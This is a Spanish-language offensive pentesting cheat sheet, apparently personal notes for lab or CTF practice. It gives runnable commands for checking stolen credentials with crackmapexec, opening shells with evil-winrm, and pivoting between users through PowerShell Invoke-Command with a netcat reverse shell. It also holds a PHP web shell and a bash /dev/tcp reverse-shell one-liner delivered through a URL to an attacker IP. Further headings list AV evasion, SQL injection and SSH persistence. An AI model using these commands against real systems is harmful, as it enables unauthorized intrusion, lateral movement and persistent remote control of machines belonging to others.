# Revisar si las credenciales obtenidas son validas 
crackmapexec smb xxx.xxx.xxx.xxx -u 'username' -p 'password'
# Si en la respuesta hay un [+] quiere decir que son validas

# Revisar si el usario forma parte del remote management users de Windows
crackmapexec winrm xxx.xxx.xxx.xxx -u 'username' -p 'password'
# Si en la repsuesta hay un Pwn3d! nos podemos conectar con evil-winrm y obtener una consola interactiva 

#Obtener una consola interactiva en la maquina victima con evil-winrm
evil-winrm -i xxx.xxx.xxx.xxx -u 'username' -p 'password'


# ----- User Pivoting teniendo credenciales -----
# Usando Invoke-Command y scriptblocks a traves de Powershell
#Abrir consola de powershell
powershell
>$user = dominio.local\username2
>$password = ConverTo-SecureString 'Password2' -AsPlainText -Force  (La vsariable password siempre hay que darlo de alta como secure string)
#Definir una nueva credencial de windows
$cred = New-Object System.Management.Automation.PSCredential($user, $password)
#ejecutar el comando como el usario2 con Invoke-Command y Scriptblock
Invoke-Command -ComputerName DC -Credential $cred -Scriptblock { whoami }
#Con este metodo puedo ponerme en escucha en la maquina atacante
#y ejecutar un cmd con netcat para tener una reverse shell con el nuevo usario
Invoke-Command -ComputerName DC -Credential $cred -Scriptblock { c:\Temp\netcat.exe -e cdm xxx.xxx.xxx.xxx Puerto }

# ----- Invocar a una Reverse Shell desde un One Liner si tenemos RCE desde la URL -----
# Si tenemos la posibilidad de esceibir un archivo directo en la ruta de la pagina web
# Colamos un PHP para la ejecucion de comandos mediante shell_exec par ver si lo interpreta
<?php
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
# si lo interpreta podemos ejecutar comandos desde la URL
http://xxx.xxx.xxx.xxx/cmd.php?cmd=whoami
# Nos ponemos en escucha con Netcat
nc -nvlp 443
# Ponemos el one liner en la ejecucion del cmd
http://xxx.xxx.xxx.xxx/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.15.45/443 0>%261"
#Con esto obtenemos una consola de bash interactiva
#Un tratamiento a la TTY ya tendriamos una consola estable

# ----- Captura de pantalla a traves de X11 -----
# Si tenemos acceso al archivo .XAuthority de un usuario podemos jugar con su display y tomar una captura de su pantalla
# Buscar en Hacktrick Pentesting X11


# Ejecucion de POCs o exploits
- Defense Evasion
    + AV Detection Methods
    + AV Evasion Technics
- Metasploit
- SQL injection
    + Sqlmap
- Fuerza bruta panel de administración (Scripts Python|)

# ----- Conexion Permanete -----
- Conexión SSH con authorized keys
